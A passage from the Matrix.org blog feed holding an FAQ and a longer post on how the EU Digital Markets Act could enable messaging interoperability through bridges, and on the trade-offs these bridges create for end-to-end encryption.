&lt;p&gt;Next up: we’re going to get the Rust matrix-sdk-crypto independently audited (once &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rust-sdk&#x2F;milestone&#x2F;1&quot;&gt;this burndown&lt;&#x2F;a&gt; is complete) so that everyone using the matrix-sdk-crypto state machine for Matrix E2EE can have some independent reassurance too - a huge step forward from the wild west of E2EE SDK implementations today!&lt;&#x2F;p&gt;
&lt;p&gt;– Matthew&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Technical FAQ on the Digital Markets Act</title>
        <published>2022-03-30T14:13:00+00:00</published>
        <updated>2022-03-30T14:13:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2022/03/30/technical-faq-on-the-digital-markets-act/" type="text/html"/>
        <id>https://matrix.org/blog/2022/03/30/technical-faq-on-the-digital-markets-act/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ve been flooded with questions about the &lt;a href=&quot;https:&#x2F;&#x2F;www.europarl.europa.eu&#x2F;news&#x2F;en&#x2F;press-room&#x2F;20220315IPR25504&#x2F;&quot;&gt;DMA&lt;&#x2F;a&gt;
since it was announced last week, and have spotted some of the
gatekeepers jumping to the wrong conclusions about what it might entail.
Just in case you don&#x27;t want to wade through
yesterday&#x27;s &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;03&#x2F;29&#x2F;how-do-you-implement-interoperability-in-a-dma-world&#x2F;&quot;&gt;sprawling blog post&lt;&#x2F;a&gt;,
we&#x27;ve put together a quick FAQ to cover the most important points based on
our understanding.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;what-does-dma-mean-for-the-gatekeepers&quot;&gt;What does DMA mean for the gatekeepers?&lt;&#x2F;h3&gt;
&lt;p&gt;The gatekeepers will have to open and document their existing APIs, so that
alternative clients and&#x2F;or bridges can connect to their service. The DMA
requires that the APIs &lt;em&gt;must&lt;&#x2F;em&gt; expose the same level of privacy for remote
users as for local users. So, if their service is end-to-end-encrypted
(E2EE), the APIs must expose the same E2EE semantics (e.g. so that an
alternative client connecting would have to implement E2EE too). For
E2EE-capable APIs to work, the gatekeeper will likely have to model remote
users as if they were local in their system. In the short term (one year
horizon) this applies only to 1:1 chats and file transfers. In the long term
(three year horizon) this applies to group chats and voip calls&#x2F;conferences
too.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;who-counts-as-a-gatekeeper&quot;&gt;Who counts as a “gatekeeper”?&lt;&#x2F;h3&gt;
&lt;p&gt;The DMA defines any tech company worth over €75B or with over €7.5B of
turnover as a gatekeeper, who must open their communication APIs. This means
only the tech giants are in scope (e.g. as of today that includes Meta,
Apple, Google, Microsoft, Salesforce&#x2F;Slack - not Signal, Telegram, Discord,
Twitter).&lt;&#x2F;p&gt;
&lt;h3 id=&quot;does-this-mean-the-gatekeepers-are-being-forced-to-implement-an-open-standard-such-as-matrix-or-xmpp&quot;&gt;Does this mean the gatekeepers are being forced to implement an open standard such as Matrix or XMPP?&lt;&#x2F;h3&gt;
&lt;p&gt;No. They can keep their existing implementations and APIs. For
interoperability with other service providers, they will need to use a
bridge (which could bridge via a common language such as Matrix or XMPP).&lt;&#x2F;p&gt;
&lt;h3 id=&quot;are-bridges-secure&quot;&gt;Are bridges secure?&lt;&#x2F;h3&gt;
&lt;p&gt;If the service lacks end-to-end-encryption (Slack, Teams, Google Chat,
non-secret chats on Facebook Messenger, Instagram, Google Messages etc) then
the bridge does not reduce security or privacy, beyond the fact that bridged
conversations by definition will be visible to the bridge and to the service
you are interoperating with.&lt;&#x2F;p&gt;
&lt;p&gt;If the service has E2EE (WhatsApp, iMessage, secret chats on Messenger) then
the bridge will necessarily have to decrypt (and reencrypt, where possible)
the data when passing it to the other service. This means the conversation is
no longer E2EE, and thus less secure (the bridge could be compromised and
inspect or reroute their messages) - and so gatekeepers must warn the user
that their conversation is leaving their platform and is no longer E2EE with
something like this:&lt;&#x2F;p&gt;
&lt;div style=&quot;text-align: center&quot;&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-03-29-warning.jpg&quot; width=&quot;430&quot;&#x2F;&gt;
&lt;&#x2F;div&gt;
&lt;br&#x2F;&gt;
&lt;h3 id=&quot;why-is-the-dma-good&quot;&gt;Why is the DMA good?&lt;&#x2F;h3&gt;
&lt;p&gt;The upside is that the user has the freedom to use an infinite number of
services (bots, virtual assistants, CRMs, translation services, etc) as well
as speak to any other user in the world, regardless what platform they use.&lt;&#x2F;p&gt;
&lt;p&gt;It also puts much-needed pressure on the gatekeepers to innovate and
differentiate rather than rely on their network effects to attract new
users - creating a much more vibrant, open, competitive marketplace for
users.&lt;&#x2F;p&gt;
&lt;p&gt;See &amp;quot;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;03&#x2F;29&#x2F;how-do-you-implement-interoperability-in-a-dma-world#whats-driven-the-dma&quot;&gt;What&#x27;s driven the DMA?&lt;&#x2F;a&gt;&amp;quot;
for more details.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;if-the-dma-requires-that-remote-users-have-the-same-security-as-local-users-how-can-bridges-work&quot;&gt;If the DMA requires that remote users have the same security as local users, how can bridges work?&lt;&#x2F;h3&gt;
&lt;p&gt;The DMA requires that the &lt;em&gt;APIs&lt;&#x2F;em&gt; expose the same level of security as for
local users - ie E2EE must be exposed. If the users in a conversation choose
to use a bridge and thus reencrypt the messages, then it is their choice to
tradeoff encryption in favour of interoperability for a given conversation.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;does-this-undermine-the-gatekeepers-current-encryption&quot;&gt;Does this undermine the gatekeepers’ current encryption?&lt;&#x2F;h3&gt;
&lt;p&gt;Absolutely not. Users talking to other users within the same E2EE-capable
gatekeeper will still be E2EE (assuming the gatekeeper doesn’t pull that rug
from under its users) - and in fact it gives the gatekeepers an excellent way
to advertise the selling point that E2EE is only guaranteed when you speak to
other users on the same platform.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;but-why-do-we-need-bridges-if-everyone-spoke-a-common-protocol-you-wouldn-t-ever-have-to-decrypt-messages-to-convert-them-between-protocols&quot;&gt;But why do we need bridges? If everyone spoke a common protocol, you wouldn’t ever have to decrypt messages to convert them between protocols.&lt;&#x2F;h3&gt;
&lt;p&gt;Practically speaking, we don’t expect the gatekeepers to throw away their
existing stacks (or implement multihead messengers that also speak open
protocols). It’s true that if they natively spoke Matrix or XMPP then the
reencryption problem would go away, but it’s more realistic to focus on
opening the existing APIs than interpret the legislation as a mandate to
speak Matrix. Perhaps in future players will adopt Matrix of their own
volition.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;where-do-these-bridges-come-from&quot;&gt;Where do these bridges come from?&lt;&#x2F;h3&gt;
&lt;p&gt;There is already a vibrant community of developers who build unofficial
bridges to the gatekeepers - eg Element, Beeper and hundreds of open source
developers in the Matrix and XMPP communities. Historically these bridges
have been hampered by having to use unofficial and private APIs, making them
a second class citizen - but with open documented APIs guaranteed by the DMA
we eagerly anticipate an explosion of high quality transparent bridges which
will be invisible to the end user.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;can-you-run-e2ee-bridges-clientside-to-make-them-safer&quot;&gt;Can you run E2EE bridges clientside to make them safer?&lt;&#x2F;h3&gt;
&lt;p&gt;Maybe. For instance, current iMessage bridges work by running iMessage on a
local iPhone or Mac and then reencrypting the messages there for
interoperability. Given the messages are already exposed on the client
anyway, this means that E2EE is not broken - and avoids decrypting them on a
server. There is lots of development in this space currently, and with open
APIs guaranteed by DMA the pace should speed up significantly.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;how-can-you-tell-what-service-you-should-use-to-talk-to-a-given-remote-user&quot;&gt;How can you tell what service you should use to talk to a given remote user?&lt;&#x2F;h3&gt;
&lt;p&gt;For 1:1 chats this is easy: you can simply ask the user which service they
want to use to talk to a given user, if that user is not already on that
service.&lt;&#x2F;p&gt;
&lt;p&gt;For group chats it is harder, and this is why the deadline for group chats is
years away. The problem is that you need a way to verify the identity of
arbitrary numbers of remote users on  different platforms - effectively
looking up their identity in a secure manner which stops services from
maliciously spoofing identities.&lt;&#x2F;p&gt;
&lt;p&gt;One possible way to solve this would be for users to explicitly link their
identity on one service with that on the gatekeeper’s service - eg “Alice on
AliceChat is talking in the same room as Bob on BobChat; Bob will be asked to
prove to AliceChat that he is the real Bob” - and so if AliceChat has already
validated Bob’s identity, then this can be used to spot him popping up on
other services. It also gives Bob a way to block themselves from ever being
unwittingly bridged to AliceChat.&lt;&#x2F;p&gt;
&lt;p&gt;There are many other approaches too - and the onus is on the industry to
figure out the best solution for decentralised identity in the next 3-4 years
in order to realise the most exciting benefits of the DMA.&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;For a much deeper dive into the above, please check out our post at &amp;quot;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;03&#x2F;29&#x2F;how-do-you-implement-interoperability-in-a-dma-world&quot;&gt;How do you implement interoperability in a DMA world?&lt;&#x2F;a&gt;&amp;quot;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>How do you implement interoperability in a DMA world?</title>
        <published>2022-03-29T17:57:10+00:00</published>
        <updated>2022-03-29T09:23:58+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2022/03/29/how-do-you-implement-interoperability-in-a-dma-world/" type="text/html"/>
        <id>https://matrix.org/blog/2022/03/29/how-do-you-implement-interoperability-in-a-dma-world/</id>
        
        <content type="html">&lt;p&gt;With last week’s revelation that the &lt;a href=&quot;https:&#x2F;&#x2F;www.europarl.europa.eu&#x2F;news&#x2F;en&#x2F;press-room&#x2F;20220315IPR25504&#x2F;deal-on-digital-markets-act-ensuring-fair-competition-and-more-choice-for-users&quot;&gt;EU Digital Markets Act&lt;&#x2F;a&gt;
will require tech gatekeepers (companies valued at over $75B or with over
$7.5B of turnover) to open their communication APIs for the purposes of
interoperability, there’s been a lot of speculation on what this could mean
in practice, To try to ground the conversation a bit, we’ve had a go at
outlining some concrete proposals for how it could work.&lt;&#x2F;p&gt;
&lt;p&gt;However, before we jump in, we should review how the DMA has come to pass.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;what-s-driven-the-dma&quot;&gt;What’s driven the DMA?&lt;&#x2F;h3&gt;
&lt;p&gt;Today’s gatekeepers all began with a great product, which got more and more
popular until it grew to such a size that one of the biggest reasons to use
the service is not necessarily the product any more, but the benefits of
being able to talk to a large network of users. This rapidly becomes
anti-competitive, however: the user becomes locked into the network and can’t
switch even if they want to.  Even when people have a &lt;strong&gt;really&lt;&#x2F;strong&gt; good reason
to move provider (e.g. &lt;a href=&quot;https:&#x2F;&#x2F;www.theregister.com&#x2F;2021&#x2F;01&#x2F;06&#x2F;whatsapp_privacy_policy_demand&#x2F;&quot;&gt;WhatsApp’s terms of use changing&lt;&#x2F;a&gt; to
share user data with Facebook, &lt;a href=&quot;https:&#x2F;&#x2F;blog.elcomsoft.com&#x2F;2021&#x2F;01&#x2F;apple-scraps-end-to-end-encryption-of-icloud-backups&#x2F;&quot;&gt;Apple doing a 180 on end-to-end encrypting iCloud backups&lt;&#x2F;a&gt;,
or &lt;a href=&quot;https:&#x2F;&#x2F;www.wired.co.uk&#x2F;article&#x2F;telegram-encryption-end-to-end-features&quot;&gt;Telegram not actually being end-to-end encrypted&lt;&#x2F;a&gt;),
in practice &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@carlagriggio&#x2F;the-great-messaging-app-migration-that-didnt-really-happen-56af637bc5d8&quot;&gt;hardly anything changes&lt;&#x2F;a&gt; -
because the users are socially obligated to keep using the service in order
to talk to the rest of the users on it.&lt;&#x2F;p&gt;
&lt;p&gt;As a result, it’s literally harmful to the users. Even if a new service
launches with a shiny new feature, there is enormous inertia that must be
overcome for users to switch, thanks to the pull of their existing network -
and even if they do, they’ll just end up with their conversations haphazardly
fragmented over multiple apps. This isn’t accepted for email; it isn’t
accepted for the phone network; it isn’t accepted on the Internet itself -
and it shouldn’t be accepted for messaging apps either.&lt;&#x2F;p&gt;
&lt;p&gt;Similarly: the closed networks of today’s gatekeepers put a completely
arbitrary limit on how users can extend and enrich their own conversations.
On email, if you want to use a fancy new client like Superhuman - you can. If
you want to hook up a digital assistant or translation service to help you
wrangle your email - you can.  If you want to hook up your emails to a CRM to
help you run your business - you can.  But with today’s gatekeepers, you have
literally no control: you’re completely at the mercy of the service
provider - and for something like WhatsApp or iMessage the options are
limited at best.&lt;&#x2F;p&gt;
&lt;p&gt;Finally - all the users’ conversation metadata for that service (who talks to
who, and when) ends up centralised in the gatekeepers’ databases, which then
become an incredibly valuable and sensitive treasure trove, at risk of abuse.
And if the service provider identifies users by phone number, the user is
forced to disclose their phone number (a deeply sensitive personal
identifier) to participate, whether they want to or not.  Meanwhile the user
is massively incentivised not to move away: effectively they are held hostage
by the pull of the service’s network of users.&lt;&#x2F;p&gt;
&lt;p&gt;So, the DMA exists as a strategy to improve the situation for users and
service providers alike by building a healthier dynamic ecosystem for
communication apps; encouraging products to win by producing the best quality
product rather than the biggest network. To quote Cédric O (Secretary of
State for the Digital Sector of France), the strategy of the legislation came
from Washington advice to address the anticompetitive behaviour of the
gatekeepers “not by breaking them up… but by breaking them open.”  By
requiring the gatekeepers to open their APIs, the door has at last been
opened to give users the option to pick whatever service they prefer to use,
to choose who they trust with their data and control their conversations as
they wish - without losing the ability to talk to their wider audience.&lt;&#x2F;p&gt;
&lt;p&gt;However, something as groundbreaking as this is never going to be completely
straightforward.  Of course while some basic use cases (i.e. non-E2EE chat)
are easy to implement, they initially may not have a UX as smooth as a closed
network which has ingested all your address book; and other use cases(eg E2EE
support) may require some compromises at first.  It’s up to the industry to
figure out how to make the most of that challenge, and how to do it in a way
which minimises the impact on privacy - especially for end-to-end encrypted
services.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;what-problems-need-to-be-solved&quot;&gt;What problems need to be solved?&lt;&#x2F;h3&gt;
&lt;p&gt;We’ve &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;03&#x2F;25&#x2F;interoperability-without-sacrificing-privacy-matrix-and-the-dma&quot;&gt;already written about this&lt;&#x2F;a&gt;
from a Matrix perspective, but to recap - the main challenge is the trade-off
between interoperability and privacy for gatekeepers who provide end-to-end
encryption, which at a rough estimate means: WhatsApp, iMessage, secret chats
in Facebook Messenger, and Google Messages.  The problem is that even with
open APIs which correctly expose the end-to-end encrypted semantics (as DMA
requires), the point where you interoperate with a different system
inevitably means that you’ll have to re-encrypt the messages for that system,
unless they speak precisely the same protocol - and by definition you end up
trusting the different system to keep the messages safe.  Therefore this
increases the attack surface on the conversations, putting the end-to-end
encryption at risk.&lt;&#x2F;p&gt;
&lt;p&gt;Alex Stamos (ex-CISO at Facebook) said that “&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;alexstamos&#x2F;status&#x2F;1507366543360897028&quot;&gt;WhatsApp rolling out mandatory
end-to-end encryption was the largest improvement in communications privacy
in human history&lt;&#x2F;a&gt;” – and we agree.
Guaranteed end-to-end encrypted conversations on WhatsApp is amazing, and
should be protected at all costs. If users are talking to other users on
WhatsApp (or any set of users communicating within the same E2EE messenger),
E2EE should and must be maintained - and there is nothing in the DMA which says otherwise.&lt;&#x2F;p&gt;
&lt;p&gt;But what if the user consciously wants to prioritise interoperability over
encryption?  What if the user wants to hook their WhatsApp messages into a
CRM, or run them through a machine translation service, or try to start a
migration to an alternative service because they don’t trust Meta?  Should
privacy really come so spectacularly at the expense of user freedom?&lt;&#x2F;p&gt;
&lt;p&gt;We also have the problem of figuring out how to reference users on other
platforms.  Say that I want to talk to a user with a given phone number, but
they’re not on my platform - how do I locate them?  What if my platform only
knows about phone numbers, but you’re trying to talk to a user on a platform
which uses a different format for identifiers?&lt;&#x2F;p&gt;
&lt;p&gt;Finally, we have the problem of mitigating abuse: opening up APIs makes it
easier for bad actors to try to spam or phish or otherwise abuse users within
the gatekeepers. There are going to have to be changes in anti-abuse
services&#x2F;software, and some signals that the gatekeeper platforms currently
use are going to go away or be less useful, but that doesn&#x27;t mean the whole
thing is intractable. It will require changes and innovative thinking, but
we’ve been making steady progress (e.g. the work done by &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;moderation-needs-a-radical-change&#x2F;&quot;&gt;Element’s trust and
safety team&lt;&#x2F;a&gt;). Meanwhile, the
gatekeepers already have massive anti-abuse systems in place to handle the
billions of users within their walled gardens, and unofficial APIs are
already widespread: adding official APIs does not change the landscape
significantly (assuming interoperability is implemented in such a way that
the existing anti-abuse mechanisms still apply).&lt;&#x2F;p&gt;
&lt;p&gt;In the past, gatekeepers dismissed the effort of interop as not being
worthwhile - after all, the default course of action is to build a walled
garden, and having built one, the temptation is to try to trap as many users
as possible.  It was also not always clear that there were services worth
interoperating with (thanks to the chilling effects of the gatekeepers
themselves, in terms of stifling innovation for communication startups).
Nowadays this situation has fundamentally changed however: there is a vibrant
ecosystem of open communication startups out there, and a huge appetite to
build a vibrant open ecosystem for interoperable communication, but like the
open web itself.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;what-are-the-requirements&quot;&gt;What are the requirements?&lt;&#x2F;h3&gt;
&lt;p&gt;Before going further in considering solutions, we need to review the actual
requirements of the DMA.  Our best understanding at this point is that the
DMA will mandate that:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Gatekeepers will have to provide open and documented APIs to their services, on request, in order to facilitate interoperability (i.e. so that other services can communicate with their users).&lt;&#x2F;li&gt;
&lt;li&gt;These APIs must preserve the same level of end-to-end encryption (if any) to remote users as is available to local users.&lt;&#x2F;li&gt;
&lt;li&gt;This applies to 1:1 messaging and file transfer in the short term, and group messaging, file-transfer, 1:1 VoIP and group VoIP in the longer term.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;so-what-could-this-actually-look-like&quot;&gt;So, what could this actually look like?&lt;&#x2F;h3&gt;
&lt;p&gt;The DMA legislation deliberately doesn’t focus on implementation, instead
letting the industry figure out how this could actually work in practice.
There are many different possible approaches, and so from our point of view
as Matrix we’ve tried to sketch out some options to make the discussion more
concrete. Please note these are preliminary thoughts, and are far from
perfect - but hopefully useful as a starting point for discussion.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;finding-bob&quot;&gt;Finding Bob&lt;&#x2F;h4&gt;
&lt;p&gt;Imagine that you have a user Alice on an existing gatekeeper, which we’ll call
AliceChat, who runs an E2EE messaging service which identifies users using
phone numbers.  Say that they want to start a 1-to-1 conversation with Bob,
who doesn’t use AliceChat, but Alice knows he is a keen user of BobChat.
Today, you’d have no choice but to send them an SMS and nag them to join
AliceChat (sucks to be them if they don’t want to use that service, or if
they’re unable to for whatever reason - e.g. their platform isn’t supported,
or their government has blocked access, etc), or join BobChat yourself.&lt;&#x2F;p&gt;
&lt;div style=&quot;text-align: center&quot;&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-03-29-bob-invite.jpg&quot; width=&quot;430&quot;&#x2F;&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-03-29-bob-invite-b.png&quot; width=&quot;430&quot;&#x2F;&gt;
&lt;&#x2F;div&gt;
&lt;br&#x2F;&gt;
&lt;p&gt;However, imagine if instead the gatekeeper app had a user experience where the
app prompted you to talk to the user via a different platform instead.  It’d
be no different to your operating system prompting you to pick which app to
use to open a given file extension (rather than the OS vendor hardcoding it
to one of their own apps - another win for user rights &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Microsoft_Corp._v._Commission&quot;&gt;led by the EU&lt;&#x2F;a&gt;!).&lt;&#x2F;p&gt;
&lt;div style=&quot;text-align: center&quot;&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-03-29-bob-invite2.jpg&quot; width=&quot;430&quot;&#x2F;&gt;
&lt;&#x2F;div&gt;
&lt;br&#x2F;&gt;
&lt;p&gt;Now, the simplest approach in the short term would be for each gatekeeper to
pre-provision a set of options of possible alternative networks.  (The DMA
says that, on request, other service providers can ask to have access to the
gatekeeper’s APIs for the purposes of interoperability, so the gatekeeper
knows who the alternative networks may be).  “Bob is not on AliceChat - do
you want to try to reach him instead on BobChat, CharlieChat, DaveChat
(etc)”.&lt;&#x2F;p&gt;
&lt;p&gt;Much like users can configure their preferred applications for file extensions
in an operating system today, users would also be able to add their own
preferred service providers - simply specifying their domain name.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;connecting-to-bob&quot;&gt;Connecting to Bob&lt;&#x2F;h4&gt;
&lt;p&gt;Now, AliceChat itself needs to figure out how to query the remote service
provider to see if Bob actually exists there.  Given the DMA requires that
gatekeepers provide open APIs with the same level of security to remote users
as their local ones using today’s private APIs - and very deliberately
doesn’t mandate specific protocols for interoperability - they will need to
locate a bridge which can connect to the other system.&lt;&#x2F;p&gt;
&lt;p&gt;In this thought experiment, the bridge used would be up to the destination
provider.  For instance, bobchat.com could announce that AliceChat users
should connect to it via alicechat-bridge.bobchat.com using the AliceChat
protocol(or matrix-bridge.bobchat.com via Matrix or xmpp-bridge.bobchat.com
via XMPP) by a simple HTTP API or even a .well-known URL.  Users might also
be able to override the bridge used to connect to them (e.g. to point instead
at a client-side bridge), and could sign the advertisement to prove that it
hadn’t been tampered with.&lt;&#x2F;p&gt;
&lt;p&gt;AliceChat would then connect to the discovered bridge using AliceChat’s
vendor-specific newly opened API, and would then effectively treat Bob as if
they were a real AliceChat user and client to all intents and purposes.  In
other words, Bob would effectively be a “ghost user” on AliceChat, and
subject to all their existing anti-abuse mechanisms.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, the other side of the bridge converts through to whatever the
target system is - be that XMPP, Matrix, a different proprietary API, etc.
For Matrix, it’d be chatting away to a homeserver via the &lt;a href=&quot;https:&#x2F;&#x2F;spec.matrix.org&#x2F;latest&#x2F;application-service-api&#x2F;&quot;&gt;Application Service
API&lt;&#x2F;a&gt; (using
&lt;a href=&quot;https:&#x2F;&#x2F;docs.mau.fi&#x2F;bridges&#x2F;general&#x2F;end-to-bridge-encryption.html&quot;&gt;End-to-Bridge Encryption&lt;&#x2F;a&gt; via
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;blob&#x2F;travis&#x2F;msc&#x2F;otk-dl-appservice&#x2F;proposals&#x2F;3202-encrypted-appservices.md&quot;&gt;MSC3202&lt;&#x2F;a&gt;).
It’s also worth noting that the target might not even be a bridge - it could
be a system which already natively speaks AliceChat’s end-to-end encrypted
API, thus preserving end-to-end encryption without any need to re-encrypt.
It’s also worth noting that while historically bridges have had a bad
reputation as being a second class (often a second class afterthought),
Matrix has shown that by considering them as a first class citizen and really
focusing on mapping the highest common denominator between services rather
than lowest common denominator, it’s possible for them to work transparently
in practice.  &lt;a href=&quot;https:&#x2F;&#x2F;beeper.com&quot;&gt;Beeper&lt;&#x2F;a&gt; is a great example of Matrix
bridging being used for real in the wild (rather amusingly they just
&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;ericmigi&#x2F;status&#x2F;1507827177374445569&quot;&gt;shipped emoji reactions for WhatsApp&lt;&#x2F;a&gt; on iOS via their
WhatsApp&amp;lt;-&amp;gt;Matrix bridge before WhatsApp themselves did…)&lt;&#x2F;p&gt;
&lt;p&gt;Architecturally, it could look like this:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-03-29-alice-bob.jpg&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Or, more likely (given a dedicated bridge between two proprietary services
would be a bit of a special case, and you’d have to solve the dilemma of who
hosts the bridge), both services could run a bridge to a common open standard
protocol like Matrix or XMPP instead (thus immediately enabling
interoperability with everyone else connected to that network):&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-03-29-alice-bob-bridged.jpg&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Please note that while these examples show server-side bridges, in practice it
would be infinitely preferable to use client-side bridges when connecting to
E2EE services - meaning that decrypted message data would only ever be
exposed on the client (which obviously has access to the decrypted data
already).  Client-side bridges are currently complicated by OS limits on
background tasks and push notification semantics (on mobile, at least), but
one could envisage a scenario where you install a little stub AliceChat
client on your phone which auths you with AliceChat and then sits in the
background receiving messages and bridging them through to Matrix or XMPP,
like this:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-03-29-alice-bob-clientside.jpg&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Another possible architecture could be for the E2EE gatekeeper to expose their
open APIs on the clients, rather than the server.  DMA allows this, to the
best of our knowledge - and would allow other apps on the device to access
the message data locally (with appropriate authorisation, of course) - effectively
doing a form of realtime
&lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Google_Data_Liberation_Front&quot;&gt;data liberation&lt;&#x2F;a&gt;
from the closed service to an open system, looking something like this:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-03-29-alice-bob-clientside-apis.jpg&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Finally, it&#x27;s worth noting that when peer-to-peer decentralised protocols
like &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;06&#x2F;02&#x2F;introducing-p-2-p-matrix&#x2F;&quot;&gt;P2P Matrix&lt;&#x2F;a&gt;
enter production, clientside bridges could bridge directly into a local
communication server running on the handset - thus avoiding metadata being
exposed on Matrix or XMPP servers providing a common language between the
service providers.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;locating-users&quot;&gt;Locating users&lt;&#x2F;h4&gt;
&lt;p&gt;Now, the above describes the simplest and most naive directory lookup system
imaginable - the problem of deciding which provider to use to connect to each
user is shouldered by the users.  This isn’t that unreasonable - after all,
users may have strong feelings about what providers to use to talk to a given
user.  Alice might be quite happy to talk to Bob via BobChat, but might be
very deliberately avoiding talking to him on DaveChat, for whatever ominous
reasons.&lt;&#x2F;p&gt;
&lt;p&gt;However, it’s likely in future we will also see other directory services
appear in order to map phone numbers (or other identities) to providers -
whether these piggyback on top of existing identity providers
(gatekeepers, DNS, telcos, SSO providers, governments) or are decentralised
through some other mechanism.  For instance, Bob could send AliceChat a
blinded proof that he authorises them to automatically route traffic to him
over at BobChat, with BobChat maintaining a matching proof that Bob is who he
claims to be (having gone through BobChat’s auth process) - and the proofs
could be linked using a temporary key such that Bob doesn’t even need to
maintain a long-term one. (Thanks to James Monaghan for suggesting this one!)&lt;&#x2F;p&gt;
&lt;p&gt;Another alternative to having the user decide where to find each other could
be to use a decentralised Keybase-style identity system to track verified
mappings of identities (phone numbers, email addresses etc) through to
service providers - perhaps something like &lt;a href=&quot;https:&#x2F;&#x2F;idx.xyz&#x2F;&quot;&gt;IDX&lt;&#x2F;a&gt; might fit
the bill?  While this decentralised identity lookups have historically been a
hard problem, there is a &lt;em&gt;lot&lt;&#x2F;em&gt; of promising work happening in this space
currently and the future looks promising.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;talking-to-bob&quot;&gt;Talking to Bob&lt;&#x2F;h4&gt;
&lt;p&gt;Meanwhile, Alice still needs to talk to Bob. As already discussed, unless
everyone speaks the same end-to-end encrypted protocol (be it Matrix,
WhatsApp or anything else), we inevitably have a trade-off here between
interoperability and privacy if Bob is not on the same system as Alice
(assuming AliceChat is end-to-end encrypted) - and we will need to clearly
warn Alice that the conversation is no longer end-to-end encrypted:&lt;&#x2F;p&gt;
&lt;div style=&quot;text-align: center&quot;&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2022-03-29-warning.jpg&quot; width=&quot;430&quot;&#x2F;&gt;
&lt;&#x2F;div&gt;
&lt;br&#x2F;&gt;
&lt;p&gt;To be clear: right now, today, if Bob were on AliceChat, he could be
copy-pasting all your messages into (say) Google Translate in a frantic
effort to workaround the fact that his closed E2EE chat platform has no way
to do machine translation.  However, in a DMA world, Bob could legitimately
loop a translation bot into the conversation… and Alice would be warned that
the conversation was no longer secure (given the data is now being bridged
over to Google).&lt;&#x2F;p&gt;
&lt;p&gt;This is a clear improvement in user experience and transparency.  Likewise, if
I’m talking to a bridged user today on one of these platforms, I have no way
of telling that they have chosen to prioritise interop over E2EE - which is
frankly terrifying.  If I’m talking to someone on WhatsApp today I blindly
assume that they are E2EE as they are on the same platform - and if they’re
using an unofficial app or bridge, I have no way to tell.  Whereas in a DMA
world, you would expect the gatekeeper to transparently expose it.&lt;&#x2F;p&gt;
&lt;p&gt;If anything, this is good news for the gatekeeper in that it consciously
advertises a big selling point for them: that for full E2EE, users need to
talk to other users in the same walled garden (unless of course the platform
speaks the same protocol).  No more need for bus shelter adverts to remind
everywhere that WhatsApp is E2EE - instead they can remind the user every
time they talk to someone outside the walled garden!&lt;&#x2F;p&gt;
&lt;p&gt;Just to spell it out: the DMA does not require or encourage any reduction in
end-to-end encryption for WhatsApp or similar: full end-to-end encryption
will still be there for users in the same platform, including through to
